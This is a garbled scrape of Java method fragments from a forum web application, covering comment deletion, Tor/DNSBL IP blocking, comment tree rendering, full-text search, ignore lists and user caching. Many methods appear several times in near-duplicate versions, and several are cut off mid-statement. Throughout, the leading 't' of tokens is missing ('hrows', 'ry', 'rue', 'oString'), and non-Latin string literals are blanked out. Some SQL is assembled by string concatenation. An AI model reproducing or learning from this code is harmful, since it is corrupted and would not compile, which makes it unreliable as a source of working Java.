public String deleteAllComments ( Connection db , Logger logger , User moderator ) hrows SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; ry { deleter = new CommentDeleter ( db , logger ) ; st = db . createStatement ( ) ; rs = st . executeQuery ( " SELECT id FROM comments WHERE userid= " + id + " AND not deleted ORDER BY id DESC FOR update " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " id " ) ; out . append ( " # " ) . append ( msgid ) . append ( " <br> " ) ; out . append ( deleter . deleteReplys ( msgid , moderator , rue ) ) ; out . append ( deleter . deleteComment ( msgid , " 4.7 Flood (auto) " , moderator , - 20 ) ) ; out . append ( " <br> " ) ; } } finally { if ( deleter ! = null ) { deleter . close ( ) ; } if ( rs ! = null ) { rs . close ( ) ; } if ( st ! = null ) { st . close ( ) ; } } return out . oString ( ) ; } 
public static void checkBlockIP ( Connection db , String addr ) hrows AccessViolationException , SQLException , UnknownHostException , TextParseException { DNSBLClient dnsbl = new DNSBLClient ( " or.ahbl.org " ) ; if ( dnsbl . checkIP ( addr ) ) { hrow new AccessViolationException ( " : tor.ahbl.org " ) ; } IPBlockInfo block = getBlockInfo ( db , addr ) ; if ( block = = null ) { return ; } block . checkBlock ( ) ; } 
private static synchronized void initServletLogger ( ServletContext context ) { if ( siteLogger = = null ) { siteLogger = new ServletLogger ( context ) ; 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " op100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " oplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { siteLogger.notice("template", "execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public boolean checkIP ( String addr ) hrows TextParseException { String query = invertIPAddress ( addr ) + " . " + zone ; logger . fine ( " Looking for " + query ) ; Lookup lookup = new Lookup ( query , Type . A ) ; lookup . setResolver ( resolver ) ; Record [ ] r = lookup . run ( ) ; if ( r = = null | | r . length = = 0 ) { return false ; } logger . info ( " DNSBL: found " + addr + " in DNSBL: " + r [ 0 ] ) ; TODO: check what we really got ;-) return true; } 
private static String invertIPAddress ( String originalIPAddress ) { StringTokenizer = new StringTokenizer ( originalIPAddress , " . " ) ; String inverted = . nextToken ( ) ; while ( . hasMoreTokens ( ) ) { inverted = . nextToken ( ) + " . " + inverted ; } return inverted ; } 
public static boolean getTor ( String addr ) hrows TextParseException , UnknownHostException { DNSBLClient dnsbl = new DNSBLClient ( " or.ahbl.org " ) ; return ( dnsbl . checkIP ( addr ) ) ; } 
public String deleteComment ( int msgid , String reason , User user , int scoreBonus ) hrows SQLException { st1 . clearParameters ( ) ; st2 . clearParameters ( ) ; st1 . setInt ( 1 , msgid ) ; st2 . setInt ( 1 , msgid ) ; st2 . setInt ( 2 , user . getId ( ) ) ; st2 . setString ( 3 , reason ) ; st4 . setInt ( 1 , scoreBonus ) ; st4 . setInt ( 2 , msgid ) ; st1 . executeUpdate ( ) ; st2 . executeUpdate ( ) ; st4 . executeUpdate ( ) ; logger . info ( " " + msgid + " " + user . getNick ( ) + " ` " + reason + '\'' ) ; return " " + msgid + " " ; } 
private String deleteReplys ( int msgid , User user , boolean score , int depth ) hrows SQLException { List < Integer > replys = new ArrayList < Integer > ( ) ; StringBuffer out = new StringBuffer ( ) ; st3 . setInt ( 1 , msgid ) ; ResultSet rs = st3 . executeQuery ( ) ; while ( rs . next ( ) ) { int r = rs . getInt ( " id " ) ; replys . add ( r ) ; } rs . close ( ) ; for ( Integer r : replys ) { out . append ( deleteReplys ( r , user , score , depth + + ) ) ; out . append ( " " ) . append ( r ) . append ( " <br> " ) ; switch ( depth ) { case 0 : if ( score ) { deleteComment ( r , " 7.1 (, 0) " , user , - 2 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; case 1 : if ( score ) { deleteComment ( r , " 7.1 (, 1) " , user , - 1 ) ; } else { deleteComment ( r , " 7.1 () " , user , 0 ) ; } break ; default : deleteComment ( r , " 7.1 (, >1) " , user , 0 ) ; break ; } } return out . oString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getRedirectUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " op100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " oplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.info("execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public String deleteAllComments ( Connection db , User moderator ) hrows SQLException { Statement st = null ; ResultSet rs = null ; CommentDeleter deleter = null ; StringBuilder out = new StringBuilder ( ) ; ry { deleter = new CommentDeleter ( db ) ; st = db . createStatement ( ) ; rs = st . executeQuery ( " SELECT id FROM comments WHERE userid= " + id + " AND not deleted ORDER BY id DESC FOR update " ) ; while ( rs . next ( ) ) { int msgid = rs . getInt ( " id " ) ; out . append ( " # " ) . append ( msgid ) . append ( " <br> " ) ; out . append ( deleter . deleteReplys ( msgid , moderator , rue ) ) ; out . append ( deleter . deleteComment ( msgid , " 4.7 Flood (auto) " , moderator , - 20 ) ) ; out . append ( " <br> " ) ; } } finally { if ( deleter ! = null ) { deleter . close ( ) ; } if ( rs ! = null ) { rs . close ( ) ; } if ( st ! = null ) { st . close ( ) ; } } return out . oString ( ) ; } 
private void buildTree ( ) { for ( Comment comment : comments ) { CommentNode node = new CommentNode ( comment ) ; 
public void buildList ( List < Comment > list ) { if ( comment ! = null ) list . add ( comment ) ; for ( CommentNode child : childs ) { child . buildList ( list ) ; 
public void hideNode ( Set < Integer > hideSet ) { if ( comment ! = null ) { hideSet . add ( comment . getMessageId ( ) ) ; } for ( CommentNode child : childs ) { child . hideNode ( hideSet ) ; 
public String showAll ( boolean reverse , int offset , int limit ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , null ) ; return buf . oString ( ) ; } 
public String showFiltered ( boolean reverse , int offset , int limit ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . oString ( ) ; } 
public String showSubtree ( int parentId ) hrows IOException , SQLException , UtilException , MessageNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , false , 0 , 0 , null ) ; return buf . oString ( ) ; } 
public String showAll ( boolean reverse , int offset , int limit ) hrows IOException , UtilException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , null ) ; return buf . oString ( ) ; } 
public String showFiltered ( boolean reverse , int offset , int limit ) hrows IOException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . oString ( ) ; } 
public String showSubtree ( int parentId ) hrows IOException , UtilException , MessageNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , false , 0 , 0 , null ) ; return buf . oString ( ) ; } 
public int getCommentPage ( Comment comment , Template mpl ) hrows UtilException { int messages = mpl . getProf ( ) . getInt ( " messages " ) ; boolean reverse = mpl . getProf ( ) . getBoolean ( " newfirst " ) ; return getCommentPage ( comment , messages , reverse ) ; } 
public static String showComments ( Connection db , String nick ) hrows SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, topics.id as topicid, comments.id as msgid, comments.postdate FROM sections, groups, topics, comments, users WHERE sections.id=groups.section AND groups.id=topics.groupid AND comments.topic=topics.id AND comments.userid=users.id AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException { StringBuilder select = new StringBuilder ( " SELECT msgs.id, title, postdate, section, topic, nick, score, max_score, rank(idxFTI, q) as rank, headline(message, q, 'HighlightAll=True') as headline " ) ; if ( include = = SEARCH_ALL ) { select . append ( " FROM msgs_and_cmts as msgs, msgbase, plainto_tsquery(?) as q " ) ; } else { select . append ( " FROM msgs, msgbase, plainto_tsquery(?) as q " ) ; } select . append ( " WHERE msgs.id = msgbase.id AND idxFTI @@ q " ) ; if ( date = = SEARCH_3MONTH ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ) ; } else if ( date = = SEARCH_YEAR ) { select . append ( " AND postdate>CURRENT_TIMESTAMP-'1 year'::interval " ) ; } if ( section ! = 0 ) { select . append ( " AND section= " ) . append ( section ) ; } if ( sort = = SORT_DATE ) { select . append ( " ORDER BY postdate DESC " ) ; } else { select . append ( " ORDER BY rank DESC " ) ; } select . append ( " LIMIT 100 " ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( select . oString ( ) ) ; 
private String printResults ( ResultSet rs ) hrows SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public boolean isIgnored ( Map < Integer , String > ignoreList ) { return ignoreList ! = null & & ! ignoreList . isEmpty ( ) & & ignoreList . containsValue ( nick ) ; } 
public String showFiltered ( Connection db , boolean reverse , int offset , int limit , int filterChain , String nick ) hrows IOException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . oString ( ) ; } 
public static int parseFilterChain ( String filter ) { if ( filter . equals ( " list " ) ) { return FILTER_IGNORED ; } if ( filter . equals ( " anonymous " ) ) { return FILTER_ANONYMOUS ; } if ( filter . equals ( " listanon " ) ) { return FILTER_IGNORED + FILTER_ANONYMOUS ; } return FILTER_NONE ; } 
public static String oString ( int filterMode ) { switch ( filterMode ) { case FILTER_NONE : return " show " ; 
public static Map < Integer , String > getIgnoreListHash ( Connection db , String nick ) hrows SQLException { PreparedStatement pst = db . prepareStatement ( " SELECT a.ignored,b.nick FROM ignore_list a, users b WHERE a.userid=(SELECT id FROM users WHERE nick=?) AND b.id=a.ignored " ) ; pst . clearParameters ( ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; Map < Integer , String > cignored = new Hashtable < Integer , String > ( ) ; while ( rs . next ( ) ) { cignored . put ( rs . getInt ( " ignored " ) , rs . getString ( " nick " ) ) ; } return cignored ; } 
public void addNick ( Connection db , String nick ) hrows SQLException , UserNotFoundException { User user = new User ( db , nick ) ; int id = user . getId ( ) ; if ( ! ignoreList . containsKey ( id ) ) { PreparedStatement addPst = db . prepareStatement ( " INSERT INTO ignore_list (userid,ignored) VALUES(?,?) " ) ; 
public boolean removeNick ( Connection db , int uid ) hrows SQLException { if ( ! ignoreList . containsKey ( uid ) ) return false ; PreparedStatement pst = db . prepareStatement ( " DELETE FROM ignore_list WHERE userid=? AND ignored=? " ) ; pst . clearParameters ( ) ; pst . setInt ( 1 , userId ) ; pst . setInt ( 2 , uid ) ; boolean r = pst . executeUpdate ( ) = = 1 ; if ( r ) { ignoreList . remove ( uid ) ; } return r ; } 
public static void main ( String [ ] args ) hrows IOException { Hashtable defaults = getDefaultProfile ( ) ; FileOutputStream f = new FileOutputStream ( " anonymous " ) ; ObjectOutputStream o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _debug " ) ; defaults . put ( " DebugMode " , Boolean . TRUE ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white2 " ) ; defaults . put ( " style " , " white2 " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; defaults = new Hashtable ( ) ; f = new FileOutputStream ( " _white " ) ; defaults . put ( " style " , " white " ) ; o = new ObjectOutputStream ( f ) ; o . writeObject ( defaults ) ; o . close ( ) ; f . close ( ) ; } 
public static String showComments ( Connection db , String nick ) hrows SQLException { StringBuilder out = new StringBuilder ( ) ; PreparedStatement pst = null ; ry { pst = db . prepareStatement ( " SELECT sections.name as ptitle, groups.title as gtitle, topics.title, " + " opics.id as topicid, comments.id as msgid, comments.postdate " + " FROM sections, groups, topics, comments, users " + " WHERE sections.id=groups.section AND groups.id=topics.groupid " + " AND comments.topic=topics.id AND comments.userid=users.id " + " AND users.nick=? AND NOT comments.deleted ORDER BY postdate DESC LIMIT 50 " ) ; pst . setString ( 1 , nick ) ; ResultSet rs = pst . executeQuery ( ) ; while ( rs . next ( ) ) { out . append ( " <tr><td> " ) . append ( rs . getString ( " ptitle " ) ) . append ( " </td> " ) ; out . append ( " <td> " ) . append ( rs . getString ( " gtitle " ) ) . append ( " </td> " ) ; out . append ( " <td><a href= \" jump-message.jsp?msgid= " ) . append ( rs . getInt ( " opicid " ) ) . append ( " &amp;cid= " ) . append ( rs . getInt ( " msgid " ) ) . append ( " \" rev=contents> " ) . append ( StringUtil . makeTitle ( rs . getString ( " itle " ) ) ) . append ( " </a></td> " ) ; out . append ( " <td> " ) . append ( Template . dateFormat . format ( rs . getTimestamp ( " postdate " ) ) ) . append ( " </td></tr> " ) ; } rs . close ( ) ; } finally { if ( pst ! = null ) { pst . close ( ) ; } } return out . oString ( ) ; } 
public boolean isIgnored ( Map < Integer , String > ignoreList ) { return ignoreList ! = null & & ! ignoreList . isEmpty ( ) & & ignoreList . keySet ( ) . contains ( userid ) ; } 
public String showAll ( boolean reverse , int offset , int limit ) hrows IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , null ) ; return buf . oString ( ) ; } 
public String showFiltered ( Connection db , boolean reverse , int offset , int limit , int filterChain , String nick ) hrows IOException , UtilException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; Set < Integer > hideSet = new HashSet < Integer > ( ) ; showCommentList ( buf , comments . getList ( ) , reverse , offset , limit , hideSet ) ; return buf . oString ( ) ; } 
public String showSubtree ( int parentId ) hrows IOException , UtilException , MessageNotFoundException , SQLException , UserNotFoundException { StringBuffer buf = new StringBuffer ( ) ; CommentNode parentNode = comments . getNode ( parentId ) ; if ( parentNode = = null ) { hrow new MessageNotFoundException ( parentId ) ; } List < Comment > parentList = new ArrayList < Comment > ( ) ; parentNode . buildList ( parentList ) ; showCommentList ( buf , parentList , false , 0 , 0 , null ) ; return buf . oString ( ) ; } 
public void addNick ( Connection db , String nick ) hrows SQLException , UserNotFoundException { User user = User . getUser ( db , nick ) ; int id = user . getId ( ) ; if ( ! ignoreList . containsKey ( id ) ) { PreparedStatement addPst = db . prepareStatement ( " INSERT INTO ignore_list (userid,ignored) VALUES(?,?) " ) ; 
public static User getCurrentUser ( Connection db , HttpSession session ) hrows SQLException , UserNotFoundException { if ( ! Template . isSessionAuthorized ( session ) ) { return null ; } return getUser ( db , ( String ) session . getAttribute ( " nick " ) ) ; } 
public static User getUser ( Connection con , String name ) hrows SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; User user = new User ( con , name ) ; String shortCacheId = " User?id= " + user . getId ( ) ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; mcc . set ( cacheId , user , new Date ( new Date ( ) . getTime ( ) + 300 * 1000 ) ) ; return user ; } 
public static User getUser ( Connection db , int id ) hrows SQLException , UserNotFoundException { return getUser ( db , id , false ) ; } 
public static User getUserCached ( Connection db , int id ) hrows SQLException , UserNotFoundException { return getUser ( db , id , rue ) ; } 
private static User getUser ( Connection db , int id , boolean useCache ) hrows SQLException , UserNotFoundException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String shortCacheId = " User?id= " + id ; String cacheId = MemCachedSettings . getId ( shortCacheId ) ; User res = null ; if ( useCache ) { res = ( User ) mcc . get ( cacheId ) ; } if ( res = = null ) { res = new User ( db , id ) ; mcc . set ( cacheId , res , new Date ( new Date ( ) . getTime ( ) + 300 * 1000 ) ) ; } return res ; } 
public boolean isAnonymousScore ( ) { return isAnonymous ( ) | | isBlocked ( ) | | score < ANONYMOUS_LEVEL_SCORE ; } 
public String get ( Viewer viewer , Template mpl , boolean nocache , boolean closeConnection ) hrows UtilException , SQLException , IOException { MemCachedClient mcc = MemCachedSettings . getClient ( ) ; String cacheId = MemCachedSettings . getId ( viewer . getVariantID ( mpl . getProf ( ) ) ) ; String res = null ; if ( ! nocache ) { ime = 0 ; long current = new Date ( ) . getTime ( ) ; res = ( String ) mcc . get ( cacheId ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = rue ; } if ( res = = null ) { ry { long current = new Date ( ) . getTime ( ) ; Connection db = mpl . getConnection ( " viewer-cacher " ) ; res = viewer . show ( db ) ; ime = new Date ( ) . getTime ( ) - current ; fromCache = false ; } finally { if ( closeConnection ) { mpl . getObjectConfig ( ) . SQLclose ( ) ; } } mcc . add ( cacheId , res , viewer . getExpire ( ) ) ; } return res ; } 
public static boolean isAnonymousProfile ( String name ) { if ( name = = null ) { return rue ; } return name . startsWith ( " _ " ) ; } 
private String printResults ( ResultSet rs ) hrows SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
private String printResults ( ResultSet rs ) hrows SQLException { StringBuilder out = new StringBuilder ( " <h1> </h1> " ) ; out . append ( " <div class= \" messages \" ><div class= \" comment \" > " ) ; while ( rs . next ( ) ) { String itle = rs . getString ( " itle " ) ; int opic = rs . getInt ( " opic " ) ; int id = rs . getInt ( " id " ) ; String headline = rs . getString ( " headline " ) ; Timestamp postdate = rs . getTimestamp ( " postdate " ) ; String nick = rs . getString ( " nick " ) ; int userScore = rs . getInt ( " score " ) ; int userMaxScore = rs . getInt ( " max_score " ) ; String url ; if ( opic = = 0 ) { url = " jump-message.jsp?msgid= " + id ; } else { url = " jump-message.jsp?msgid= " + opic + " &amp;cid= " + id ; } out . append ( " <table width= \" 100% \" cellspacing=0 cellpadding=0 border=0> " ) ; out . append ( " <tr class=body><td> " ) ; out . append ( " <div class=msg> " ) ; out . append ( " <h2><a href= \" " ) . append ( url ) . append ( " \" > " ) . append ( HTMLFormatter . htmlSpecialChars ( itle ) ) . append ( " </a></h2> " ) ; out . append ( " <p> " ) . append ( headline ) . append ( " </p> " ) ; out . append ( " <p><i> " ) . append ( nick ) . append ( ' ' ) ; if ( ! " anonymous " . equals ( nick ) ) { out . append ( User . getStars ( userScore , userMaxScore ) ) . append ( ' ' ) ; } out . append ( " (<a href= \" whois.jsp?nick= " ) . append ( URLEncoder . encode ( nick ) ) . append ( " \" >*</a>) ( " ) . append ( Template . dateFormat . format ( postdate ) ) . append ( " )</i> " ) ; out . append ( " </div></td></tr></table><p> " ) ; } out . append ( " </div></div> " ) ; return out . oString ( ) ; } 
public String DocumentFooter ( boolean closeHtml ) hrows IOException , StorageException { StringBuffer out = new StringBuffer ( ) ; out . append ( " <p><i><a href= \" " ) . append ( getMainUrl ( ) ) . append ( " \" > " ) . append ( getMainUrl ( ) ) . append ( " </a></i> " ) ; if ( ! isMainPage ( ) ) { out . append ( " <div align=center><iframe src= \" dw.jsp?width=728&amp;height=90&amp;main=0 \" width= \" 728 \" height= \" 90 \" scrolling= \" no \" frameborder= \" 0 \" ></iframe></div> " ) ; } out . append ( " <p><div align=center> " ) ; if ( isMainPage ( ) ) { out . append ( config . getStorage ( ) . readMessage ( " buttons " , " op100-main-button " ) ) ; out . append ( config . getStorage ( ) . readMessage ( " buttons " , " oplist-main-button " ) ) ; out.append(config.getStorage().readMessage("buttons", "spylog-button")); } out.append("</div>"); Google analytics out.append("<script src=\"http:www.google-analytics.com/urchin.js\" type=\"text/javascript\">" + "</script>" + "<script type=\"text/javascript\">" + "_uacct = \"UA-2184304-1\";" + "urchinTracker();" + "</script>"); if (closeHtml) { out.append("</body></html>"); } Date currentDate = new Date(); long millis = currentDate.getTime() - startDate.getTime(); if (millis>WARNING_EXEC_TIME) { logger.info("execTime="+millis/1000+" seconds (dbWait="+config.getDbWaitTime()/1000+" seconds): "+requestString); } return out.toString(); } 
public int saveNewMessage ( Connection db , String remoteAddr ) hrows SQLException { PreparedStatement pst = null ; PreparedStatement pstMsgbase = null ; ry { allocation MSGID 
public Message getNextMessage ( Connection db ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT min(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate>? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT min(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id>? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public Message getPreviousMessage ( Connection db ) hrows SQLException { PreparedStatement pst ; int scrollMode = Section . getScrollMode ( getSectionId ( ) ) ; switch ( scrollMode ) { case Section . SCROLL_SECTION : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics, groups WHERE topics.groupid=groups.id AND topics.commitdate=(SELECT max(commitdate) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.commitdate<? AND topics.groupid=groups.id AND groups.section=? AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setTimestamp ( 1 , commitDate ) ; pst . setInt ( 2 , sectionid ) ; break ; case Section . SCROLL_GROUP : pst = db . prepareStatement ( " SELECT topics.id as msgid FROM topics WHERE topics.id=(SELECT max(topics.id) FROM topics, groups, sections WHERE sections.id=groups.section AND topics.id<? AND topics.groupid=? AND topics.groupid=groups.id AND (topics.moderate OR NOT sections.moderate) AND NOT deleted) " ) ; pst . setInt ( 1 , msgid ) ; pst . setInt ( 2 , guid ) ; break ; case Section . SCROLL_NOSCROLL : default : return null ; } ry { ResultSet rs = pst . executeQuery ( ) ; 
public boolean isEditable ( ) { return ! ( isExpired ( ) | | isDeleted ( ) ) & & section . isPremoderated ( ) ; } 
public boolean isPremoderated ( ) { return moderate ; } 
public String show ( Connection db ) hrows IOException , SQLException , UtilException { StringBuffer buf = new StringBuffer ( ) ; Statement st = db . createStatement ( ) ; StringBuilder where = new StringBuilder ( " sections.id=groups.section AND topics.id=msgbase.id AND topics.userid=users.id " + " AND topics.groupid=groups.id AND NOT deleted " ) ; if ( ! viewAll ) { where . append ( " AND (topics.moderate OR NOT sections.moderate) " ) ; } else { where . append ( " AND (NOT topics.moderate) AND sections.moderate " ) ; } if ( section ! = 0 ) { where . append ( " AND section= " ) . append ( section ) ; } if ( group ! = 0 ) { where . append ( " AND groupid= " ) . append ( group ) ; } if ( datelimit ! = null ) { where . append ( " AND " ) . append ( datelimit ) ; } ResultSet res = st . executeQuery ( " SELECT topics.title as subj, topics.lastmod, topics.stat1, postdate, nick, image, " + " groups.title as gtitle, topics.id as msgid, sections.comment, groups.id as guid, " + " opics.url, topics.linktext, imagepost, vote, sections.name as pname, linkup, " + " 